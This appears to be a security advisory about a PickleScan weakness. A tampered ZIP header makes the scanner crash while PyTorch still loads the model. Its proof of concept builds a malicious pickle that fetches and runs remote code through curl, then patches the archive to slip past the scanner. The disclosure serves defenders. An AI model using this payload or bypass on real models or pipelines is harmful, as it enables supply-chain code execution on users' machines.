summary: "Zip Exploit Crashes Picklescan But Not PyTorch\n### Summary\n\nPickleScan is vulnerable\
  \ to a ZIP archive manipulation attack that causes it to crash when attempting to extract\
  \ and scan PyTorch model archives. By modifying the filename in the ZIP header while keeping\
  \ the original filename in the directory listing, an attacker can make PickleScan raise a\
  \ BadZipFile error. However, PyTorch's more forgiving ZIP implementation still allows the\
  \ model to be loaded, enabling malicious payloads to bypass detection.\n\n### Details\n\n\
  Python's built-in zipfile module performs strict integrity checks when extracting ZIP files.\
  \ If a filename stored in the ZIP header does not match the filename in the directory listing,\
  \ zipfile.ZipFile.open() raises a BadZipFile error. PickleScan relies on zipfile to extract\
  \ and inspect the contents of PyTorch model archives, making it susceptible to this manipulation.\n\
  \nPyTorch, on the other hand, has a more tolerant ZIP handling mechanism that ignores these\
  \ discrepancies, allowing the model to load even when PickleScan fails. An attacker can exploit\
  \ this behavior to embed a malicious pickle file inside a model archive, which PyTorch will\
  \ load, while preventing PickleScan from scanning the archive.\n\n### PoC\n```\nimport os\n\
  import torch\n\nclass RemoteCodeExecution:\n    def __reduce__(self):\n        return os.system,\
  \ (f\"eval \\\"$(curl -s http://localhost:8080)\\\"\",)\n\n\nmodel = RemoteCodeExecution()\n\
  file = \"does_not_scan_but_opens_in_torch.pth\"\ntorch.save(model, file)\n\n# modify the header\
  \ to cause the zip file to raise execution in picklescan\nwith open(file, \"rb\") as f:\n\
  \    data = f.read()\n\n# Replace only the first occurrence of \"data.pkl\" with \"datap.kl\"\
  \nmodified_data = data.replace(b\"data.pkl\", b\"datap.kl\", 1)\n\n# Write back the modified\
  \ content\nwith open(file, \"wb\") as f:\n    f.write(modified_data)\n\n# Load the infected\
  \ model\ntorch.load(file)  \n```\n\n### Impact\n\nSeverity: `High`\n\n- Who is impacted? Any\
  \ organization or individual using PickleScan to detect malicious pickle files in PyTorch\
  \ models.\n\n- What is the impact? Attackers can embed malicious payloads inside PyTorch model\
  \ archives while preventing PickleScan from scanning them.\n\n- Potential Exploits: This technique\
  \ can be used in supply chain attacks to distribute backdoored models via platforms like Hugging\
  \ Face.\n\n### Recommendations\n\n- Use a More Tolerant ZIP Parser: PickleScan should handle\
  \ minor ZIP header inconsistencies more gracefully instead of failing outright.\n\n- Detect\
  \ Malformed ZIPs: Instead of crashing, PickleScan should log warnings and attempt to extract\
  \ valid files."
